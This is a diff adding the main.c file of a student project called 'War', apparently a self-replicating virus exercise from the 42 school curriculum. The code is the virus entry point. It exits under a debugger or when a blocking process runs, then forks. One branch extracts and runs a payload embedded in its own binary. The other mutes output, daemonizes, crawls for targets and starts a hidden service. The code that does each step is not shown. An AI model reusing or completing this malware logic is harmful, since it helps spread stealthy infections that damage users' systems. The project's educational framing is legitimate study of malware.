@@ -1,0 +1,55 @@
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   main.c                                             :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
+/*   Updated: 2026/06/16 11:42:42 by pboucher         ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
+
+#include "war.h"
+#include "service.h"
+
+#include <unistd.h>
+#include <stdio.h>
+
+void	sha256(uint8_t *msg, uint64_t len, uint8_t buf[32]);
+
+int	main(__attribute__((unused)) int ac, char **av, char **envp)
+{
+	if (runningUnderDebugger() || is_process_running(BLOCKING_PROCESS))
+		return (0);
+	t_exec_ctx	exec_ctx = {0};
+
+	exec_ctx.av = av;
+	exec_ctx.envp = envp;
+	readlink("/proc/self/exe", exec_ctx.exec_path, sizeof(exec_ctx.exec_path));
+
+	int	pid = fork();
+	if (pid == -1)
+		return (0);
+	else if (pid != 0)
+	{
+		uint8_t		*buf;
+		uint64_t	size;
+
+		if (extract_payload(exec_ctx.exec_path, &buf, &size) == 0)
+			exec_payload(&exec_ctx, buf, size);
+		return (0);
+	}
+
+	if (mute_outputs() == -1)
+		return (0);
+
+	int	whoami = daemonize();
+	if (whoami == I_AM_A_MISTAKE)
+		return (0);
+	else if (whoami == I_AM_MAIN_PROCESS)
+		return (crawl(&exec_ctx), 0);
+	else if (whoami == I_AM_CHILD_PROCESS)
+		return (run_service(exec_ctx.exec_path), 0);
+	return (0);
+}
